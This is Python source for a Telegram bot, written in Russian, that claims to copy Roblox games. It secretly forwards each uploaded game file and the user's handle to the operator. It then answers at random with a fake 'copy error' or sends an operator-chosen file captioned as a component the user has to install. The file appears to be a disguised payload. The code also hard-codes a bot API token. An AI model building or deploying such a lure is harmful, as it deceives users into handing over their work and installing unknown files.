import telebot
from telebot import types
import random

# --- НАСТРОЙКИ ---
API_TOKEN = '8480317600:AAFFTPcDLKH4RPRoLEnygaDKEvPMHp8d18U'
ADMIN_ID = 6655100280  # Твой ID
CHANNEL_URL = 'https://t.me/твой_канал'
SECRET_FILE_ID = 'ID_ТВОЕГО_ФАЙЛА' # Тот самый ID, который ты получил через /get_id

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("✅ Начать копирование", callback_data='step_1')
    btn_tutor = types.InlineKeyboardButton("📖 Tutorial (Канал)", url=CHANNEL_URL)
    markup.add(btn_start, btn_tutor)
    
    text = "🟢 **Привет!** Мы копируем плейсы Roblox. Нажми кнопку ниже, чтобы начать! 🌿"
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'step_1')
def ask_game(call):
    msg = bot.send_message(call.message.chat.id, "🧪 **Шаг 1:** Напиши название игры:")
    bot.register_next_step_handler(msg, process_game)

def process_game(message):
    user_data[message.chat.id] = {'game': message.text}
    msg = bot.send_message(message.chat.id, "🟢 **Шаг 2:** Теперь отправь файл игры:")
    bot.register_next_step_handler(msg, process_file)

def process_file(message):
    chat_id = message.chat.id
    if message.content_type in ['document', 'photo', 'video']:
        # Пересылаем админу
        bot.send_message(ADMIN_ID, f"📥 **НОВЫЙ ФАЙЛ!**\n🎮 Игра: {user_data[chat_id]['game']}\n👤 От: @{message.from_user.username}")
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        
        # Рандом 50/50
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("🔄 Повторить попытку"))
        
        if random.randint(1, 2) == 1:
            bot.send_message(chat_id, "⚠️ **Ошибка копирования!**\nСбой данных. Попробуй позже.", reply_markup=markup)
        else:
            if SECRET_FILE_ID == 'ID_ТВОЕГО_ФАЙЛА':
                bot.send_message(chat_id, "❌ Критическая ошибка системы. Файл не найден.", reply_markup=markup)
            else:
                bot.send_document(chat_id, SECRET_FILE_ID, caption="📎 Установи этот компонент для завершения.", reply_markup=markup)
    else:
        msg = bot.send_message(chat_id, "❌ Отправь именно файл!")
        bot.register_next_step_handler(msg, process_file)

@bot.message_handler(commands=['get_id'])
def get_id(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "Скинь файл для получения ID:")
        bot.register_next_step_handler(message, send_file_id)

def send_file_id(message):
    if message.document:
        bot.send_message(ADMIN_ID, f"FILE_ID: `{message.document.file_id}`", parse_mode='Markdown')
    else:
        bot.send_message(ADMIN_ID, "Это не файл.")

@bot.message_handler(func=lambda m: m.text == "🔄 Повторить попытку")
def retry(message): start(message)

bot.polling(none_stop=True)
